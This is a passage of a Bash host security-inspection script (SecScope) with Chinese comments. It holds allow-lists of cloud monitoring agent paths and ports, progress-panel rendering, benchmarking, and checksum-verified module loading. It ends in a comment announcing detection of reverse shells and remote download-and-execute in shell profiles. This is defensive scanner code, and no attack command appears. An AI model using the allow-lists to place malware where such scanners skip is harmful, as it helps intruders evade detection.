    "ospd-openvas" "qualys" "qualys-cloud-agent"
)
# 白名单路径 — 监控 Agent + 运维工具 + 运行时 + 构建工具 典型安装目录（前缀匹配）
WHITELIST_PATHS=(
    # 阿里云
    "/usr/local/aegis" "/opt/AliYunDun" "/opt/aliyun"
    # 腾讯云
    "/usr/local/qcloud" "/usr/local/qcloud/YunJing" "/usr/local/sa" "/usr/local/tencent"
    "/opt/qcloud" "/opt/YDService"
    # 华为云
    "/usr/local/hostguard" "/opt/hostguard"
    # 百度云 / 京东云 / 金山云 / UCloud / 青云
    "/opt/bce" "/opt/jdcloud" "/opt/ksc" "/opt/ucloud" "/opt/qingcloud"
    "/opt/qiniu" "/usr/local/bce"
    # 天翼云 / 浪潮 / 其他
    "/opt/moopsagent" "/opt/ctyun" "/opt/inspur" "/opt/cmcc"
    # AWS / Azure / GCP
    "/opt/aws" "/opt/amazon" "/var/lib/amazon" "/opt/microsoft" "/opt/google"
    # 运维 Agent 通用
    "/opt/opsagent" "/usr/local/scom" "/opt/datadog" "/opt/dynatrace"
    "/opt/newrelic" "/opt/splunk" "/opt/splunkforwarder"
    "/opt/zabbix" "/usr/local/zabbix" "/opt/prometheus"
    # 容器运行时
    "/var/lib/docker" "/var/lib/containerd" "/var/lib/kubelet" "/var/lib/rancher"
    "/run/containerd" "/run/docker" "/var/run/docker"
    # 开发/编译工具
    "/usr/local/go" "/usr/local/node" "/usr/lib/jvm" "/usr/local/lib/node_modules"
    "/usr/local/cargo" "/usr/local/rustup"
    # 明确归属的监控插件目录
    "/etc/zabbix/scripts" "/usr/lib/zabbix"
    # Snap/Flatpak 运行时
    "/snap" "/var/lib/snapd" "/var/lib/flatpak"
)
WHITELIST_PORTS=(
    "22" "25" "53" "80" "110" "123" "143" "161" "162" "389" "443" "465" "514" "587"
    "601" "636" "873" "993" "995" "1080" "1433" "1521" "2049" "2181" "2375" "2376" "2379" "2380"
    "2888" "3000" "3128" "3260" "3306" "3389" "3478" "3888" "4000" "4369" "4567" "5000" "5044"
    "5222" "5269" "5349" "5432" "5444" "5601" "5672" "5778" "5900" "5938" "5984"
    "6379" "6443" "6667" "6697" "7000" "7001" "7199" "7474" "7687" "7888" "8000"
    "8001" "8009" "8080" "8086" "8088" "8090" "8123" "8161" "8200" "8300" "8301"
    "8443" "8500" "8529" "8848" "8888" "9000" "9001" "9042" "9090" "9091" "9092"
    "9093" "9100" "9160" "9200" "9300" "9411" "9443" "9600" "9672" "9696" "9876"
    "9998" "9999" "10000" "10050" "10051" "11211" "15672" "16379" "20000" "27017"
    "27018" "28888" "31000" "50000" "50010" "50070" "50075" "50470" "50475"
)

#==============================================================================
# 工具函数
#==============================================================================

term_safe() { printf '%s' "$1" | LC_ALL=C tr -d '\000-\010\013\014\016-\037\177'; }

log_message() {
    local level="$1" color="$2"; shift 2
    if [ "$PANEL_ACTIVE" = true ] && [ "$PANEL_FINISHED" = false ] && [ -n "$RAW_DIR" ]; then
        printf '[%s] %s %s\n' "$level" "$(date '+%H:%M:%S')" "$(term_safe "$*")" >> "$RAW_DIR/runtime.log"
    else
        printf '%b[%s]%b %s %s\n' "$color" "$level" "$NC" "$(date '+%H:%M:%S')" "$(term_safe "$*")"
    fi
}
log_info()  { log_message INFO  "$GREEN" "$@"; }
log_warn()  { log_message WARN  "$YELLOW" "$@"; }
log_error() { log_message ERROR "$RED" "$@"; }
log_check() { log_message CHECK "$CYAN" "$@"; }

benchmark_now_us() {
    local seconds fraction raw
    if [ -n "${EPOCHREALTIME:-}" ]; then
        seconds="${EPOCHREALTIME%.*}"
        fraction="${EPOCHREALTIME#*.}000000"
        fraction="${fraction:0:6}"
        BENCHMARK_NOW_US=$((10#$seconds * 1000000 + 10#$fraction))
        return 0
    fi
    raw=$(date +%s%N 2>/dev/null || true)
    if [[ "$raw" =~ ^[0-9]+$ ]]; then BENCHMARK_NOW_US=$((10#$raw / 1000)); else BENCHMARK_NOW_US=$(($(date +%s) * 1000000)); fi
}

benchmark_init() {
    [ "$BENCHMARK_ENABLED" = 1 ] || return 0
    [ -n "$BENCHMARK_METRICS_FILE" ] || { log_error 'SECSCOPE_BENCHMARK=1 需要 SECSCOPE_BENCHMARK_METRICS_FILE'; return 2; }
    [ ! -L "$BENCHMARK_METRICS_FILE" ] || { log_error "拒绝写入符号链接 benchmark 文件: $BENCHMARK_METRICS_FILE"; return 2; }
    mkdir -p "${BENCHMARK_METRICS_FILE%/*}" || return 2
    chmod 700 "${BENCHMARK_METRICS_FILE%/*}" 2>/dev/null || true
    : > "$BENCHMARK_METRICS_FILE" || return 2
    chmod 600 "$BENCHMARK_METRICS_FILE" || return 2
    printf '{"type":"run","schema_version":1,"profile":"%s","run_id":"%s"}\n' "$SCAN_PROFILE" "$RUN_ID" >> "$BENCHMARK_METRICS_FILE"
}

benchmark_stage_begin() {
    [ "$BENCHMARK_ENABLED" = 1 ] || return 0
    BENCHMARK_STAGE_NAME="$1"
    benchmark_now_us
    BENCHMARK_STAGE_STARTED_US=$BENCHMARK_NOW_US
}

benchmark_stage_end() {
    local stage="$1" duration
    [ "$BENCHMARK_ENABLED" = 1 ] || return 0
    [ "$BENCHMARK_STAGE_NAME" = "$stage" ] || return 0
    benchmark_now_us
    duration=$((BENCHMARK_NOW_US - BENCHMARK_STAGE_STARTED_US))
    [ "$duration" -ge 0 ] || duration=0
    printf '{"type":"stage","stage":"%s","duration_us":%s}\n' "$stage" "$duration" >> "$BENCHMARK_METRICS_FILE"
    BENCHMARK_STAGE_NAME=""
    BENCHMARK_STAGE_STARTED_US=0
}

benchmark_write_summary() {
    [ "$BENCHMARK_ENABLED" = 1 ] || return 0
    printf '{"type":"summary","profile":"%s","files_traversed":%s,"stat_calls":%s,"hash_computed":%s,"hash_reused":%s,"hash_failed":%s,"yara_scanned":%s,"yara_rules":%s,"proc_pid_visits":%s,"proc_maps_visits":%s,"socket_snapshots":%s,"fallback_count":%s}\n' \
        "$SCAN_PROFILE" "$BENCHMARK_FILE_TRAVERSED" "$BENCHMARK_STAT_CALLS" "$FILE_SCAN_HASH_SUCCESS" "$FILE_SCAN_HASH_REUSED" "$FILE_SCAN_HASH_FAILED" \
        "$YARA_SCANNED" "$YARA_RULES_LOADED" "$BENCHMARK_PROC_PID_VISITS" "$BENCHMARK_PROC_MAPS_VISITS" "$BENCHMARK_SOCKET_SNAPSHOTS" "$BENCHMARK_FALLBACK_COUNT" \
        >> "$BENCHMARK_METRICS_FILE"
}

module_file_sha256() {
    if command -v sha256sum >/dev/null 2>&1; then
        sha256sum -- "$1" 2>/dev/null | awk '{print $1}'
    elif command -v shasum >/dev/null 2>&1; then
        shasum -a 256 -- "$1" 2>/dev/null | awk '{print $1}'
    else
        openssl dgst -sha256 "$1" 2>/dev/null | awk '{print $NF}'
    fi
}

load_secscope_modules() {
    local module_name module_path relative_path checksum_file expected actual
    checksum_file="${PROGRAM_DIR}/secscope.sh.sha256"
    [ ! -L "${PROGRAM_DIR}/modules" ] || { printf '[ERROR] 拒绝加载符号链接模块目录: %s\n' "${PROGRAM_DIR}/modules" >&2; return 1; }
    for module_name in profile.sh yara.sh; do
        relative_path="modules/${module_name}"
        module_path="${PROGRAM_DIR}/${relative_path}"
        if [ ! -f "$module_path" ] || [ -L "$module_path" ] || [ ! -r "$module_path" ]; then
            printf '[ERROR] SecScope 必需模块不可用: %s\n' "$module_path" >&2
            return 1
        fi
        if [ -r "$checksum_file" ]; then
            expected=$(awk -v path="$relative_path" '$2==path {print $1; exit}' "$checksum_file" 2>/dev/null)
            [ -n "$expected" ] || { printf '[ERROR] 模块缺少发布校验值: %s\n' "$relative_path" >&2; return 1; }
            actual=$(module_file_sha256 "$module_path")
            [ -n "$actual" ] && [ "$actual" = "$expected" ] || { printf '[ERROR] SecScope 模块完整性异常: %s\n' "$relative_path" >&2; return 1; }
        fi
        # shellcheck source=/dev/null
        source "$module_path" || { printf '[ERROR] SecScope 模块加载失败: %s\n' "$relative_path" >&2; return 1; }
    done
}

load_secscope_modules || { return 1 2>/dev/null || exit 1; }

valid_schedule_interval() {
    [[ "$1" =~ ^([1-9][0-9]*)(min|h|d)$ ]]
}

panel_supported() {
    [ -t 0 ] && [ -t 1 ] && [ "$SCHEDULED_RUN" != true ]
}

panel_display_width() {
    local text i char width=0
    text=$(term_safe "$1")
    [ "$PANEL_UTF8" = true ] || text=$(printf '%s' "$text" | LC_ALL=C sed 's/[^ -~]/?/g')
    for ((i=0; i<${#text}; i++)); do
        char=${text:i:1}
        case "$char" in
            [[:ascii:]]|'✓'|'✗') width=$((width + 1)) ;;
            *) width=$((width + 2)) ;;
        esac
    done
    printf '%s' "$width"
}

panel_text_fit() {
    local text max_width out="" used=0 i char char_width
    text=$(term_safe "$1"); max_width="$2"
    [ "$PANEL_UTF8" = true ] || text=$(printf '%s' "$text" | LC_ALL=C sed 's/[^ -~]/?/g')
    for ((i=0; i<${#text}; i++)); do
        char=${text:i:1}
        case "$char" in [[:ascii:]]|'✓'|'✗') char_width=1 ;; *) char_width=2 ;; esac
        [ $((used + char_width)) -le "$max_width" ] || break
        out="${out}${char}"; used=$((used + char_width))
    done
    printf '%s%*s' "$out" $((max_width - used)) ''
}

panel_text_tail_fit() {
    local text max_width out="" used=0 i char char_width
    text=$(term_safe "$1"); max_width="$2"
    [ "$PANEL_UTF8" = true ] || text=$(printf '%s' "$text" | LC_ALL=C sed 's/[^ -~]/?/g')
    for ((i=${#text}-1; i>=0; i--)); do
        char=${text:i:1}
        case "$char" in [[:ascii:]]|'✓'|'✗') char_width=1 ;; *) char_width=2 ;; esac
        [ $((used + char_width)) -le "$max_width" ] || break
        out="${char}${out}"; used=$((used + char_width))
    done
    printf '%s%*s' "$out" $((max_width - used)) ''
}

panel_middle_fit() {
    local text="$1" max_width="$2" width keep_left keep_right
    width=$(panel_display_width "$text")
    if [ "$width" -le "$max_width" ]; then panel_text_fit "$text" "$max_width"; return; fi
    keep_left=$(((max_width - 3) / 2)); keep_right=$((max_width - 3 - keep_left))
    printf '%s...%s' "$(panel_text_fit "$text" "$keep_left")" "$(panel_text_tail_fit "$text" "$keep_right" | sed 's/[[:space:]]*$//')"
}

panel_row() {
    printf '\r\033[2K%b|%b%s%b|%b\n' "$CYAN" "$NC" "$(panel_text_fit "$1" "$PANEL_INNER_WIDTH")" "$CYAN" "$NC"
}

panel_row_ansi() {
    local ansi="$1" plain="$2" visible padding
    visible=$(panel_display_width "$plain")
    if [ "$visible" -gt "$PANEL_INNER_WIDTH" ]; then panel_row "$plain"; return; fi
    padding=$((PANEL_INNER_WIDTH - visible))
    printf '\r\033[2K%b|%b%b%*s%b|%b\n' "$CYAN" "$NC" "$ansi" "$padding" '' "$CYAN" "$NC"
}

panel_status_symbol() {
    case "$1" in
        SUCCESS) SYMBOL_PLAIN="$PANEL_OK"; SYMBOL_ANSI="${GREEN}${PANEL_OK}${NC}" ;;
        PARTIAL) SYMBOL_PLAIN="$PANEL_PARTIAL"; SYMBOL_ANSI="${YELLOW}${PANEL_PARTIAL}${NC}" ;;
        FAILED) SYMBOL_PLAIN="$PANEL_FAIL"; SYMBOL_ANSI="${RED}${PANEL_FAIL}${NC}" ;;
        RUNNING) SYMBOL_PLAIN='>>'; SYMBOL_ANSI="${YELLOW}${BOLD}>>${NC}" ;;
        *) SYMBOL_PLAIN='--'; SYMBOL_ANSI="${DIM}--${NC}" ;;
    esac
}

panel_module_token() {
    local abbr="$1" status="$2"
    panel_status_symbol "$status"
    TOKEN_PLAIN="${abbr} ${SYMBOL_PLAIN}"
    TOKEN_ANSI="${abbr} ${SYMBOL_ANSI}"
}

panel_status_list() {
    local current_statuses="" id idx status
    for id in system users process network rootkit persistence filesystem history services logs memory baseline; do
        status=WAITING
        for idx in "${!MODULE_IDS[@]}"; do
            [ "${MODULE_IDS[$idx]}" = "$id" ] && { status="${MODULE_STATUSES[$idx]}"; break; }
        done
        [ "$CURRENT_MODULE" = "$id" ] && [ "$PANEL_CURRENT_STATUS" = RUNNING ] && status=RUNNING
        current_statuses="${current_statuses}${current_statuses:+,}${status}"
    done
    printf '%s' "$current_statuses"
}

panel_write_state() {
    local tmp statuses
    [ "$PANEL_ACTIVE" = true ] && [ -n "$PANEL_STATE_FILE" ] || return 0
    statuses=$(panel_status_list)
    tmp="${PANEL_STATE_FILE}.tmp.$$"
    printf '%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s\n' \
        "$MODULE_COMPLETED" "$MODULE_TOTAL" "$(term_safe "$PANEL_CURRENT_NAME" | tr '|' '/')" \
        "$PANEL_CURRENT_STATUS" "$(term_safe "$PANEL_CURRENT_DETAIL" | tr '|' '/')" "$PANEL_PHASE" \
        "$RUN_COVERAGE" "$THREAT_CRITICAL" "$THREAT_HIGH" "$THREAT_MEDIUM" "$THREAT_LOW" \
        "$statuses" "$(term_safe "$OUTPUT_DIR" | tr '|' '/')" "$(term_safe "${PANEL_VERDICT:-}")" > "$tmp" && mv -f "$tmp" "$PANEL_STATE_FILE"
}

panel_build_modules() {
    local statuses="$1" idx=0 abbr status
    local -a values=() abbreviations=(SYS AUTH PROC NET ROOT PERSIST FILE HIST SVC LOG MEM BASE)
    IFS=',' read -r -a values <<< "$statuses"
    MODULE_ROW1_PLAIN=' '; MODULE_ROW1_ANSI=' '; MODULE_ROW2_PLAIN=' '; MODULE_ROW2_ANSI=' '
    for abbr in "${abbreviations[@]}"; do
        status="${values[$idx]:-WAITING}"; panel_module_token "$abbr" "$status"
        if [ "$idx" -lt 7 ]; then
            MODULE_ROW1_PLAIN="${MODULE_ROW1_PLAIN}${TOKEN_PLAIN}  "; MODULE_ROW1_ANSI="${MODULE_ROW1_ANSI}${TOKEN_ANSI}  "
        else
            MODULE_ROW2_PLAIN="${MODULE_ROW2_PLAIN}${TOKEN_PLAIN}  "; MODULE_ROW2_ANSI="${MODULE_ROW2_ANSI}${TOKEN_ANSI}  "
        fi
        idx=$((idx + 1))
    done
}

panel_render_once() {
    local line completed total module status activity phase coverage critical high medium low statuses report verdict
    local percent elapsed elapsed_fmt bar_width filled empty bar mode title title_text evidence findings current_line activity_line
    [ -r "$PANEL_STATE_FILE" ] || return 0
    IFS='|' read -r completed total module status activity phase coverage critical high medium low statuses report verdict < "$PANEL_STATE_FILE" || return 0
    [ "${total:-0}" -gt 0 ] || total=1; percent=$((completed * 100 / total))
    elapsed=$(($(date +%s) - RUN_STARTED_EPOCH)); elapsed_fmt=$(printf '%02d:%02d:%02d' $((elapsed/3600)) $(((elapsed%3600)/60)) $((elapsed%60)))
    mode=MANUAL; [ "$SCHEDULED_RUN" = true ] && mode=SCHEDULED
    title_text="SECSCOPE // INSPECTION ${phase}"
    title="$(panel_text_fit "$title_text" $((PANEL_INNER_WIDTH - 2)))"
    evidence="raw/module-${CURRENT_PANEL_ID:-${module}}.log"
    case "$module" in
        系统信息) evidence='raw/module-system.log' ;; 用户与认证) evidence='raw/module-users.log' ;; 进程检查) evidence='raw/module-process.log' ;;
        网络连接) evidence='raw/module-network.log' ;; '内核与 Rootkit') evidence='raw/module-rootkit.log' ;; 持久化机制) evidence='raw/module-persistence.log' ;;
        文件系统) evidence='raw/module-filesystem.log' ;; 历史与环境) evidence='raw/module-history.log' ;; 服务与供应链) evidence='raw/module-services.log' ;;
        日志分析) evidence='raw/module-logs.log' ;; 内存轻量取证) evidence='raw/module-memory.log' ;; 配置基线) evidence='raw/module-baseline.log' ;;
        *) evidence='raw/runtime.log' ;;
    esac
    bar_width=$((PANEL_INNER_WIDTH - 36)); [ "$bar_width" -lt 8 ] && bar_width=8
    filled=$((completed * bar_width / total)); empty=$((bar_width - filled))
    bar="$(printf '%*s' "$filled" '' | tr ' ' '#')$(printf '%*s' "$empty" '' | tr ' ' '.')"
    findings=" FINDINGS   CRITICAL ${critical}   HIGH ${high}   MEDIUM ${medium}   LOW ${low}   COVERAGE ${coverage}%"
    panel_build_modules "$statuses"
    [ "${PANEL_DRAWN:-false}" = true ] && printf '\033[%dA' "$PANEL_HEIGHT"
    printf '\r\033[2K%b+%s+%b\n' "$CYAN" "$(panel_text_fit " $title_text" "$PANEL_INNER_WIDTH")" "$NC"
    if [ "$PANEL_LAYOUT" = normal ]; then
        panel_row " NODE  ${HOSTNAME}       MODE  ${mode}        ELAPSED  ${elapsed_fmt}"
        panel_row ''
        panel_row " PROGRESS [${bar}] $(printf '%3d' "$percent")%       $(printf '%02d / %02d' "$completed" "$total")"
        panel_row ''
        panel_row ' MODULES'
        panel_row_ansi "$MODULE_ROW1_ANSI" "$MODULE_ROW1_PLAIN"
        panel_row_ansi "$MODULE_ROW2_ANSI" "$MODULE_ROW2_PLAIN"
        panel_row ''
        if [ "$phase" = COMPLETE ]; then
            current_line=" VERDICT    ${verdict}"; activity_line="$findings"
        else
            current_line=" CURRENT    ${module}"; activity_line=" ACTIVITY   ${activity} [${status}]"
        fi
        panel_row "$current_line"; panel_row "$activity_line"; panel_row ''
        [ "$phase" = COMPLETE ] && panel_row " REPORT     $(panel_middle_fit "$report" $((PANEL_INNER_WIDTH - 12)))" || panel_row "$findings"
        [ "$phase" = COMPLETE ] && panel_row '' || panel_row " EVIDENCE   ${evidence}"
    elif [ "$PANEL_LAYOUT" = compact ]; then
        panel_row " NODE ${HOSTNAME}  MODE ${mode}  ELAPSED ${elapsed_fmt}"
        panel_row " PROGRESS [${bar}] ${percent}% ${completed}/${total}"
        panel_row_ansi "$MODULE_ROW1_ANSI" "$MODULE_ROW1_PLAIN"
        panel_row " CURRENT ${module} [${status}]"
        panel_row " ACTIVITY ${activity}"
        panel_row " C${critical} H${high} M${medium} L${low} COVERAGE ${coverage}%"
        [ "$phase" = COMPLETE ] && panel_row " REPORT $(panel_middle_fit "$report" $((PANEL_INNER_WIDTH - 8)))" || panel_row " EVIDENCE ${evidence}"
    else
        panel_row " PROGRESS [${bar}] ${percent}% ${completed}/${total}"
        panel_row " ${module} [${status}]"
        panel_row " ${activity}"
        [ "$phase" = COMPLETE ] && panel_row " $(panel_middle_fit "$report" "$PANEL_INNER_WIDTH")" || panel_row " ${evidence}"
    fi
    printf '\r\033[2K%b+%s+%b\n' "$CYAN" "$(printf '%*s' "$PANEL_INNER_WIDTH" '' | tr ' ' '-')" "$NC"
    PANEL_DRAWN=true
}

panel_render_loop() {
    trap 'exit 0' TERM INT HUP
    PANEL_DRAWN=false
    while [ -r "$PANEL_STATE_FILE" ]; do panel_render_once; sleep 1; done
}

panel_init() {
    local cols lines locale_name
    panel_supported || return 0
    cols=$(tput cols 2>/dev/null || printf '%s' "${COLUMNS:-80}")
    lines=$(tput lines 2>/dev/null || printf '%s' "${LINES:-40}")
    [[ "$cols" =~ ^[0-9]+$ ]] || cols=80
    [[ "$lines" =~ ^[0-9]+$ ]] || lines=40
    [ "$cols" -gt 100 ] && cols=100
    [ "$cols" -gt 20 ] && cols=$((cols - 1))
    PANEL_WIDTH=$cols; PANEL_INNER_WIDTH=$((PANEL_WIDTH - 2))
    if [ "$PANEL_WIDTH" -ge 75 ]; then PANEL_LAYOUT=normal; PANEL_HEIGHT=15
    elif [ "$PANEL_WIDTH" -ge 48 ]; then PANEL_LAYOUT=compact; PANEL_HEIGHT=9
    else PANEL_LAYOUT=minimal; PANEL_HEIGHT=6
    fi
    locale_name="${LC_ALL:-${LC_CTYPE:-${LANG:-}}}"
    if [[ "$locale_name" =~ [Uu][Tt][Ff]-?8 ]]; then
        PANEL_UTF8=true; PANEL_OK='✓'; PANEL_PARTIAL='~'; PANEL_FAIL='✗'
    else
        PANEL_UTF8=false; PANEL_OK='[OK]'; PANEL_PARTIAL='[PT]'; PANEL_FAIL='[FAIL]'
    fi
    PANEL_ACTIVE=true; PANEL_FINISHED=false
    PANEL_SUMMARY_DRAWN=false; PANEL_STREAM_LINES=0
    PANEL_SUMMARY_LIVE=true
    [ "$lines" -ge 28 ] || PANEL_SUMMARY_LIVE=false
    PANEL_STATE_FILE="${OUTPUT_DIR}/.panel.state"
    printf '\n%b[INFO]%b inspection started: node=%s mode=%s profile=%s yara=%s\n' \
        "$GREEN" "$NC" "$(term_safe "$HOSTNAME")" "$([ "$SCHEDULED_RUN" = true ] && printf SCHEDULED || printf MANUAL)" \
        "$(term_safe "$SCAN_PROFILE")" "$(term_safe "${YARA_MODE:-auto}")"
    panel_write_state
}

panel_summary_render() {
    local completed="$1" total="$2" module_name="$3" status="$4" percent elapsed elapsed_fmt mode overall
    local status_line progress_line bar_width filled empty bar
    [ "$PANEL_SUMMARY_LIVE" = true ] || return 0
    [ "$total" -gt 0 ] || total=1
    [ "$completed" -ge 0 ] || completed=0
    [ "$completed" -le "$total" ] || completed="$total"
    percent=$((completed * 100 / total))
    elapsed=$(($(date +%s) - RUN_STARTED_EPOCH))
    elapsed_fmt=$(printf '%02d:%02d:%02d' $((elapsed/3600)) $(((elapsed%3600)/60)) $((elapsed%60)))
    mode=MANUAL; [ "$SCHEDULED_RUN" = true ] && mode=SCHEDULED
    overall=RUNNING; [ "$PANEL_PHASE" = COMPLETE ] && overall=COMPLETE
    bar_width=24; [ "$PANEL_INNER_WIDTH" -ge 80 ] || bar_width=12
    filled=$((completed * bar_width / total)); empty=$((bar_width - filled))
    bar="$(printf '%*s' "$filled" '' | tr ' ' '#')$(printf '%*s' "$empty" '' | tr ' ' '.')"
    status_line="STATUS ${overall} | PROFILE ${SCAN_PROFILE} | MODE ${mode} | ELAPSED ${elapsed_fmt} | CURRENT ${module_name} [${status}]"
    progress_line="PROGRESS [${bar}] ${percent}% | MODULE $(printf '%02d/%02d' "$completed" "$total") | FINDINGS C${THREAT_CRITICAL} H${THREAT_HIGH} M${THREAT_MEDIUM} L${THREAT_LOW}"
    if [ "$PANEL_SUMMARY_DRAWN" = true ]; then
        printf '\033[%dA' "$((PANEL_STREAM_LINES + 2))"
    fi
    printf '\r\033[2K%s\n' "$(panel_text_fit "$status_line" "$PANEL_INNER_WIDTH")"
    printf '\r\033[2K%s\n' "$(panel_text_fit "$progress_line" "$PANEL_INNER_WIDTH")"
    [ "$PANEL_SUMMARY_DRAWN" = true ] && [ "$PANEL_STREAM_LINES" -gt 0 ] && printf '\033[%dB' "$PANEL_STREAM_LINES"
    PANEL_SUMMARY_DRAWN=true
}

panel_finish() {
    [ "$PANEL_ACTIVE" = true ] || return 0
    [ "$PANEL_FINISHED" = false ] || return 0
    panel_write_state
    PANEL_FINISHED=true
    [ -n "$PANEL_RENDER_PID" ] && kill "$PANEL_RENDER_PID" 2>/dev/null || true
    [ -n "$PANEL_RENDER_PID" ] && wait "$PANEL_RENDER_PID" 2>/dev/null || true
    [ -n "$PANEL_STATE_FILE" ] && rm -f "$PANEL_STATE_FILE" "${PANEL_STATE_FILE}.tmp.$$" 2>/dev/null || true
    if [ "$PANEL_SUMMARY_DRAWN" = true ]; then
        panel_summary_render "$MODULE_COMPLETED" "$MODULE_TOTAL" "$PANEL_CURRENT_NAME" "$PANEL_CURRENT_STATUS"
    fi
    if [ -n "${PANEL_VERDICT:-}" ]; then
        printf '%b[INFO]%b inspection complete: verdict=%s coverage=%s%% report=%s\n' \
            "$GREEN" "$NC" "$(term_safe "$PANEL_VERDICT")" "$RUN_COVERAGE" "$(term_safe "$OUTPUT_DIR")"
    else
        printf '%b[INFO]%b inspection stopped before report completion\n' "$YELLOW" "$NC"
    fi
    printf '\033[0m'
}

panel_progress_info() {
    local completed="$1" total="$2" module_name="$3" status="$4" detail="$5" percent elapsed elapsed_fmt status_color
    [ "$total" -gt 0 ] || total=1
    [ "$completed" -ge 0 ] || completed=0
    [ "$completed" -le "$total" ] || completed="$total"
    percent=$((completed * 100 / total))
    elapsed=$(($(date +%s) - RUN_STARTED_EPOCH))
    elapsed_fmt=$(printf '%02d:%02d:%02d' $((elapsed/3600)) $(((elapsed%3600)/60)) $((elapsed%60)))
    case "$status" in
        SUCCESS) status_color="$GREEN" ;; PARTIAL) status_color="$YELLOW" ;; FAILED) status_color="$RED" ;;
        RUNNING) status_color="$YELLOW" ;; *) status_color="$DIM" ;;
    esac
    printf '%b[INFO]%b [%02d/%02d %3d%% elapsed=%s] %s %b[%s]%b %s\n' \
        "$CYAN" "$NC" "$completed" "$total" "$percent" "$elapsed_fmt" \
        "$(term_safe "$module_name")" "$status_color" "$status" "$NC" "$(term_safe "$detail")"
}

progress_bar() {
    local completed="$1" total="$2" module_name="${3:-准备中}" status="${4:-WAITING}" detail="${5:-等待执行}" percent
    [ "$total" -gt 0 ] || total=1
    [ "$completed" -gt "$total" ] && completed="$total"
    PANEL_CURRENT_NAME="$module_name"; PANEL_CURRENT_STATUS="$status"; PANEL_CURRENT_DETAIL="$detail"
    if [ "$PANEL_ACTIVE" = true ]; then
        panel_write_state
        panel_summary_render "$completed" "$total" "$module_name" "$status"
        case "$status" in
            SUCCESS|PARTIAL|FAILED)
                panel_progress_info "$completed" "$total" "$module_name" "$status" "$detail"
                PANEL_STREAM_LINES=$((PANEL_STREAM_LINES + 1))
                ;;
        esac
    else
        panel_progress_info "$completed" "$total" "$module_name" "$status" "$detail"
    fi
}

sha256_text() {
    if command -v sha256sum >/dev/null 2>&1; then
        printf '%s' "$1" | sha256sum | awk '{print $1}'
    elif command -v shasum >/dev/null 2>&1; then
        printf '%s' "$1" | shasum -a 256 | awk '{print $1}'
    else
        printf '%s' "$1" | openssl dgst -sha256 2>/dev/null | awk '{print $NF}'
    fi
}

sha256_file() {
    if command -v sha256sum >/dev/null 2>&1; then
        sha256sum -- "$1" | awk '{print $1}'
    elif command -v shasum >/dev/null 2>&1; then
        shasum -a 256 -- "$1" | awk '{print $1}'
    else
        openssl dgst -sha256 -- "$1" 2>/dev/null | awk '{print $NF}'
    fi
}

file_scan_cache_context() {
    local rules="${FILE_SCAN_RULE_FINGERPRINT:-${RULE_VERSION:-unknown}}"
    printf 'schema=%s|analyzer=%s|rules=%s|profile=%s|yara_mode=%s|yara_scanner=%s|yara_version=%s|hash_bytes=%s|max_files=%s|max_depth=%s|timeout=%s|roots=%s|exclude=%s|extensions=%s|strategy=priority-v2-single-pass' \
        "$FILE_SCAN_CACHE_SCHEMA_VERSION" "$NATIVE_HASH_ANALYZER_VERSION" "$rules" \
        "${SCAN_PROFILE:-unknown}" "${YARA_MODE:-unknown}" "${YARA_SCANNER:-none}" "${YARA_SCANNER_VERSION:-unknown}" \
        "$FILE_MAX_HASH_BYTES" "$FILE_MAX_FILES" "$FILE_MAX_DEPTH" "$FILE_TIMEOUT_SECONDS" \
        "$FILE_SCAN_ROOTS" "$FILE_EXCLUDE_NAMES" "$FILE_EXTENSIONS"
}

prepare_file_scan_cache_key() {
    FILE_SCAN_RULE_FINGERPRINT=$(sha256_text "${RULE_VERSION:-unknown}|${YARA_RULES_PATH:-}|${YARA_RULE_MAX_DEPTH:-}|${YARA_MAX_RULE_SOURCES:-}|${YARA_RULES_LOADED:-0}")
    FILE_SCAN_CACHE_KEY=$(sha256_text "$(file_scan_cache_context)")
}

file_inventory_header_is_compatible() {
    local header magic host started analyzer profile max_bytes rules key
    [ -r "$1" ] || return 1
    IFS=$'\t' read -r magic host started analyzer profile max_bytes rules key < "$1"
    [ "$magic" = "#secscope-file-inventory-v${FILE_SCAN_CACHE_SCHEMA_VERSION}" ] || return 1
    [ "$host" = "$HOST_ID" ] || return 1
    [ "$analyzer" = "$NATIVE_HASH_ANALYZER_VERSION" ] || return 1
    [ "$profile" = "$SCAN_PROFILE" ] || return 1
    [ "$max_bytes" = "$FILE_MAX_HASH_BYTES" ] || return 1
    [ "$rules" = "$FILE_SCAN_RULE_FINGERPRINT" ] || return 1
    [ "$key" = "$FILE_SCAN_CACHE_KEY" ]
}

base64_one_line() {
    printf '%s' "$1" | base64 | tr -d '\n\r'
}

base64_decode_text() {
    printf '%s' "$1" | base64 -d 2>/dev/null || printf '%s' "$1" | base64 -D 2>/dev/null || printf '%s' "$1" | base64 --decode 2>/dev/null
}

severity_rank() {
    case "$1" in CRITICAL) echo 4 ;; HIGH) echo 3 ;; MEDIUM) echo 2 ;; LOW) echo 1 ;; OBSERVE) echo 0 ;; *) echo 0 ;; esac
}

default_finding_type() {
    local severity="$1" category="$2"
    case "$category" in
        baseline|config) printf 'CONFIG_BASELINE' ;;
        supplychain) printf 'SOFTWARE_TRUST_GAP' ;;
        performance) printf 'RUNTIME_OBSERVATION' ;;
        *)
            case "$severity" in
                CRITICAL|HIGH) printf 'SECURITY_THREAT' ;;
                *) printf 'SECURITY_ANOMALY' ;;
            esac
            ;;
    esac
}

default_confidence() {
    case "$1" in
        CONFIG_BASELINE) printf 'HIGH' ;;
        SECURITY_ANOMALY|RUNTIME_OBSERVATION) printf 'LOW' ;;
        *) printf 'MEDIUM' ;;
    esac
}

# Shell profile 中的 eval 和同名命令 alias 很常见（例如 lesspipe、dircolors、
# alias ls='ls --color=auto'）。这里只匹配远程下载执行、反向 Shell、危险环境
# 注入、解码后执行，以及 alias 右侧出现第二解释器、临时路径或命令拼接的组合。
profile_suspicious_lines() {
    local file="$1"
    [ -f "$file" ] || return 0
    LC_ALL=C grep -Ein \
